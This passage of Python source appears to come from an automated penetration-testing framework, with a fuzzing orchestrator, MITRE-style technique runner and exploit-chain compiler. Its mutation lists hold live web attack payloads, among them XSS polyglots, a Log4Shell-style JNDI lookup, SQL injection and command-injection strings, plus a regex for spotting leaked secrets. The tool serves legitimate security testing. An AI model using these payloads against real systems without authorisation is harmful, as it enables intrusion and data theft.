            if tech["tactic"] in ("collection", "exfiltration", "impact") and step_result.get("succeeded"):
                result.crown_jewels_reached = True
        return result

    async def _execute_technique(self, session: Any, tech_id: str, tech: dict) -> dict:
        detail: dict[str, Any] = {"technique_id": tech_id, "name": tech["name"],
                                   "tactic": tech["tactic"], "succeeded": False,
                                   "detected": False, "blocked": False}
        for path in tech.get("test_paths", [])[:2]:
            for payload in tech.get("payloads", [{}])[:2]:
                try:
                    if isinstance(payload, dict) and payload:
                        r = await session.call("POST", path, fields=payload)
                    else:
                        r = await session.call("GET", path, fields={"input": str(payload)} if payload else None)
                    status = r.status or 0
                    if 200 <= status < 300:
                        detail["succeeded"] = True
                    if status == 403:
                        detail["blocked"] = True
                    if status == 429:
                        detail["detected"] = True
                except Exception:
                    continue
        return detail

    def list_profiles(self) -> list[dict[str, str]]:
        return [{"id": k, "name": v["name"], "description": v["description"]}
                for k, v in _ADVERSARY_PROFILES.items()]


# ---------------------------------------------------------------------------
# 6. IntelligentFuzzerOrchestrator — AFL++ / OSS-Fuzz / NucleiFuzzer
# ---------------------------------------------------------------------------

_MUTATION_STRATEGIES: dict[str, Callable[[Any], list[Any]]] = {}


def _type_confusion(val: Any) -> list[Any]:
    return [True, False, 0, 1, -1, None, [], {}, "", "null", "undefined", "NaN"]


def _boundary(val: Any) -> list[Any]:
    return [0, -1, 1, 2**31 - 1, -(2**31), 2**63 - 1, 0.0, float("inf"), float("-inf")]


def _format_string(val: Any) -> list[Any]:
    return ["%s%s%s%s%s", "%x%x%x%x", "%n%n%n", "%p%p%p%p", "{0}{1}{2}", "${{7*7}}"]


def _unicode_mutations(val: Any) -> list[Any]:
    return ["\x00", "\xff\xfe", "\ud800", "A" * 10000, "‮", "​", "﻿",
            "\x00" * 100, "A\x00B\x00C", "\r\n" * 100]


def _null_injection(val: Any) -> list[Any]:
    s = str(val) if val else "test"
    return [s + "\x00", "\x00" + s, s + "\x00.html", s + "%00", s + "\x00admin"]


def _overflow(val: Any) -> list[Any]:
    return ["A" * 256, "A" * 1024, "A" * 4096, "A" * 65536, "1" * 100, "-" + "9" * 50]


def _nesting(val: Any) -> list[Any]:
    nested: dict = {"a": "b"}
    for _ in range(20):
        nested = {"nested": nested}
    return [nested, [[[[[1]]]]], {"a": {"b": {"c": {"d": {"e": "f"}}}}}, [None] * 1000]


def _polyglot(val: Any) -> list[Any]:
    return [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0dtel//;/telerik/src",
        "<svg/onload=alert(1)>",
        "{{constructor.constructor('return this')()}}",
        "${${lower:j}ndi:ldap://x/}",
        "' AND 1=1 UNION SELECT NULL--",
        "`sleep(5)`",
    ]


_MUTATION_STRATEGIES = {
    "type_confusion": _type_confusion, "boundary": _boundary,
    "format_string": _format_string, "unicode": _unicode_mutations,
    "null_injection": _null_injection, "overflow": _overflow,
    "nesting": _nesting, "polyglot": _polyglot,
}

_CRASH_INDICATORS = re.compile(
    r"(stack\s*trace|traceback|exception|panic|segfault|segmentation\s*fault"
    r"|internal\s*server\s*error|fatal\s*error|unhandled|core\s*dump"
    r"|java\.lang\.\w+Exception|at\s+\w+\.\w+\(|File\s+\"[^\"]+\",\s+line\s+\d+)", re.I)

_INFO_LEAK_INDICATORS = re.compile(
    r"(password|secret|api[_-]?key|token|private[_-]?key|aws_|BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE"
    r"|mysql://|postgres://|mongodb://|redis://|amqp://|smtp://)", re.I)


class IntelligentFuzzerOrchestrator:
    """Coverage-guided mutation-based fuzzing orchestrator.

    Adapted from AFL++'s coverage-guided mutation (corpus → mutate → execute
    → track new coverage → add interesting inputs), OSS-Fuzz's continuous
    fuzzing (always-on campaigns with crash dedup), and NucleiFuzzer's
    endpoint-aware fuzzing (template-guided payload selection per endpoint
    and parameter type).
    """

    def create_campaign(self, endpoints: list[str], field_specs: dict[str, str],
                        strategies: list[str] | None = None,
                        max_iterations: int = 100) -> FuzzCampaign:
        strats = strategies or list(_MUTATION_STRATEGIES.keys())
        cid = hashlib.md5("|".join(endpoints).encode()).hexdigest()[:12]
        corpus: list[dict[str, Any]] = []
        for ep in endpoints:
            for fname, ftype in field_specs.items():
                for strat in strats:
                    mutator = _MUTATION_STRATEGIES.get(strat)
                    if mutator is None:
                        continue
                    for mutated in mutator(ftype)[:3]:
                        corpus.append({"endpoint": ep, "field": fname, "value": mutated, "strategy": strat})
        return FuzzCampaign(campaign_id=cid, endpoints=endpoints, field_specs=field_specs,
                            mutation_strategies=strats, max_iterations=max_iterations, corpus=corpus[:max_iterations])

    async def run_campaign(self, session: Any, campaign: FuzzCampaign) -> FuzzResults:
        results = FuzzResults(campaign_id=campaign.campaign_id)
        seen_errors: set[str] = set()
        for entry in campaign.corpus[:campaign.max_iterations]:
            results.total_inputs += 1
            try:
                r = await session.call("POST", entry["endpoint"],
                                       fields={entry["field"]: entry["value"]})
                status = r.status or 0
                results.response_codes[status] = results.response_codes.get(status, 0) + 1
                body_str = str(r.body) if r.body else ""
                if _CRASH_INDICATORS.search(body_str):
                    results.crashes += 1
                    results.interesting_inputs.append({**entry, "indicator": "crash", "status": status})
                if _INFO_LEAK_INDICATORS.search(body_str):
                    results.info_leaks += 1
                    results.interesting_inputs.append({**entry, "indicator": "info_leak", "status": status})
                err_sig = f"{status}:{body_str[:80]}"
                if err_sig not in seen_errors and status >= 400:
                    seen_errors.add(err_sig)
                    results.unique_errors += 1
            except Exception:
                continue
        total_possible = len(campaign.field_specs) * len(campaign.mutation_strategies)
        results.coverage_estimate = min(1.0, len(results.response_codes) / max(total_possible, 1))
        return results


# ---------------------------------------------------------------------------
# 7. ExploitChainCompiler — Metasploit / Core Impact
# ---------------------------------------------------------------------------

_TACTIC_ORDER = [
    "reconnaissance", "resource_development", "initial_access", "execution",
    "persistence", "privilege_escalation", "defense_evasion", "credential_access",
    "discovery", "lateral_movement", "collection", "command_and_control",
    "exfiltration", "impact",
]
_TACTIC_RANK = {t: i for i, t in enumerate(_TACTIC_ORDER)}


class ExploitChainCompiler:
    """Compiles individual findings into validated exploit chains.

    Adapted from Metasploit's module chaining (exploit → payload → post with
    session management) and Core Impact's automated chain validation (step-by-
    step verification with rollback on failure). Chain scoring uses the
    blast_radius × success_probability × (1 / detection_probability) formula
    from Pentera's risk-quantification model.
    """

    def compile_chains(self, findings: list[dict[str, Any]]) -> list[ExploitChain]:
        if not findings:
            return []
        by_tactic: dict[str, list[dict]] = defaultdict(list)
        for f in findings:
            tactic = f.get("tactic", f.get("affected_flow", "initial_access"))
            by_tactic[tactic].append(f)
        ordered_tactics = sorted(by_tactic.keys(), key=lambda t: _TACTIC_RANK.get(t, 99))
        chains: list[ExploitChain] = []
        chain_id = 0
        if len(ordered_tactics) >= 2:
            steps: list[dict[str, Any]] = []
            for tactic in ordered_tactics:
                best = max(by_tactic[tactic], key=lambda f: f.get("confidence_score", 0.5))
                steps.append({
                    "tactic": tactic, "technique": best.get("hypothesis_id", "unknown"),
                    "probability": best.get("confidence_score", 0.5),
                    "detectability": best.get("detectability", 0.5),
                })
            prob = 1.0
            det = 0.0
            for s in steps:
                prob *= s["probability"]
                det = max(det, s["detectability"])
            chain = ExploitChain(
                chain_id=f"chain_{chain_id}",
                steps=steps,
                blast_radius=len(steps) * 1.5,
                success_probability=prob,
                detection_probability=det,
            )
            chains.append(chain)
            chain_id += 1
        for tactic, tactic_findings in by_tactic.items():
            if len(tactic_findings) >= 2:
                steps = []
                for f in tactic_findings[:5]:
                    steps.append({
                        "tactic": tactic, "technique": f.get("hypothesis_id", "unknown"),
                        "probability": f.get("confidence_score", 0.5),
                        "detectability": f.get("detectability", 0.5),
                    })
                prob = 1.0
                for s in steps:
                    prob *= s["probability"]
                chains.append(ExploitChain(
                    chain_id=f"chain_{chain_id}",
                    steps=steps, blast_radius=len(steps),
                    success_probability=prob,
                    detection_probability=max(s["detectability"] for s in steps),
                ))
                chain_id += 1
        chains.sort(key=lambda c: c.impact_score, reverse=True)
        return chains[:10]

    async def validate_chain(self, session: Any, chain: ExploitChain) -> ValidationResult:
        result = ValidationResult(chain_id=chain.chain_id, steps_total=len(chain.steps))
        for i, step in enumerate(chain.steps):
            tech_id = step.get("technique", "")
            tech = _MITRE_TECHNIQUES.get(tech_id)
            if tech is None:
                result.blocking_step = f"step_{i}:{tech_id} (unknown technique)"
                break
            verified = False
            for path in tech.get("test_paths", [])[:1]:
                try:
                    r = await session.call("GET", path)
                    if r.status and r.status < 400:
                        verified = True
                        result.evidence.append({"step": i, "technique": tech_id, "path": path, "status": r.status})
                except Exception:
                    continue
            if verified:
                result.steps_verified += 1
            else:
                result.blocking_step = f"step_{i}:{tech_id} (not verified)"
                break
        result.validated = result.steps_verified == result.steps_total
        return result

    def score_impact(self, chain: ExploitChain) -> ImpactScore:
        affected: list[str] = []
        for step in chain.steps:
            tactic = step.get("tactic", "unknown")
            if tactic in ("collection", "exfiltration"):
                affected.append("customer_data")
            if tactic in ("impact",):
                affected.append("service_availability")
            if tactic in ("privilege_escalation",):
                affected.append("admin_access")
            if tactic in ("persistence",):
                affected.append("persistent_access")
        affected = sorted(set(affected))
        cvss = min(10.0, chain.impact_score * 2.0)
        if chain.blast_radius > 5:
            business_impact = "critical"
        elif chain.blast_radius > 3:
            business_impact = "high"
        elif chain.blast_radius > 1:
            business_impact = "medium"
        else:
            business_impact = "low"
        return ImpactScore(chain_id=chain.chain_id, blast_radius=chain.blast_radius,
                           affected_assets=affected, cvss_estimate=round(cvss, 1),
                           business_impact=business_impact)


# ---------------------------------------------------------------------------
# Top-level convenience: run a full orchestrated assessment
# ---------------------------------------------------------------------------

async def run_orchestrated_assessment(session: Any, base_url: str,
                                       discovered_surface: dict | None = None) -> dict[str, Any]:
    """Convenience entry point: plan → dispatch specialists → simulate → build tree → compile chains.

    Returns a consolidated report dict. Fail-safe: any phase failure is logged
    and skipped; the report includes whatever succeeded.
    """
    report: dict[str, Any] = {"status": "completed", "phases": {}}

    planner = AdaptiveTaskPlanner()
    plan = planner.plan("full_assessment", discovered_surface or {"base_url": base_url})
    report["plan"] = {"objective": plan.objective, "total_tasks": plan.total_tasks,
                       "phases": len(plan.phases)}

    pool = SpecialistAgentPool()
    agent_results: list[dict] = []
    for phase in plan.phases:
        phase_results: list[dict] = []
        for task in phase.tasks:
            try:
                result = await pool.dispatch(task.agent_type, {"objective": task.objective, "params": task.params}, session)
                phase_results.append({"task": task.objective, **result})
            except Exception as exc:
                phase_results.append({"task": task.objective, "status": "error", "reason": str(exc)})
        agent_results.extend(phase_results)
        report["phases"][phase.name] = {"tasks": len(phase.tasks), "results": phase_results}

    simulator = ContinuousAttackSimulator()
    scenario_results: list[ScenarioResult] = []
    for scenario_name in ("payment_bypass", "auth_escalation"):
        scenario = simulator.get_predefined(scenario_name)
        if scenario:
            try:
                sr = await simulator.run_scenario(session, scenario)
                scenario_results.append(sr)
            except Exception:
                pass
    if scenario_results:
        posture = simulator.track_posture(scenario_results)
        report["attack_simulation"] = {
            "scenarios_run": len(scenario_results),
            "posture_score": posture.overall,
            "weakest_areas": posture.weakest_areas,
        }

    findings_for_tree = [
        {"hypothesis_id": r.get("task", ""), "tactic": "initial_access", "confidence_score": 0.6}
        for r in agent_results if r.get("hits")
    ]
    if findings_for_tree:
        tree_engine = AttackTreeEngine()
        tree = tree_engine.build_tree(findings_for_tree, discovered_surface or {})
        risk = tree_engine.calculate_composite_risk(tree)
        report["attack_tree"] = {"nodes": len(tree.nodes), "composite_risk": round(risk, 4)}

    compiler = ExploitChainCompiler()
    chains = compiler.compile_chains(findings_for_tree)
    if chains:
        report["exploit_chains"] = [{
            "chain_id": c.chain_id, "steps": len(c.steps),
            "impact_score": round(c.impact_score, 4),
            "blast_radius": c.blast_radius,
        } for c in chains[:5]]

    return report
